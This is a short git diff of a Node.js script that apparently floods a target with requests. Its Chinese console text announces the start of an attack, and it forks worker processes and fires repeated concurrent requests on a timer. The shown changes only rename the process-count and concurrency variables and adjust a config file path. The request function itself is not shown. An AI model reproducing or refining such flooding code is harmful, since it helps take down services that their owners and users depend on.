@@ -48,7 +48,7 @@ for (let i = 0; i < args.length; i += 2) {
 
 let totalBytesReceived = 0; 
 
-const filePath = 'fetch.txt'; // 替换为你的配置文件路径
+const filePath = './fetch.txt'; // 替换为你的配置文件路径
 try {
 const fileContent = fs.readFileSync(filePath, 'utf-8');
 
@@ -165,9 +165,8 @@ if (cluster.isMaster) {
 主进程 ${process.pid}来啦
 开始攻击（打`);
 
-  //const numCPUs = os.cpus().length;
 
-  for (let i = 0; i < numCPUs; i++) {
+  for (let i = 0; i < processes; i++) {
     cluster.fork();
   }
 
@@ -176,11 +175,11 @@ if (cluster.isMaster) {
   });
 
   setInterval(() => {
-    for (let i = 0; i < concurrentRequests; i++) {
+    for (let i = 0; i < concurrent; i++) {
 		  
       setTimeout(sendRequest, i * delay);
     }
-  }, concurrentRequests * delay);
+  }, concurrent * delay);
 } else {
   setInterval(sendRequest, delay);
 }
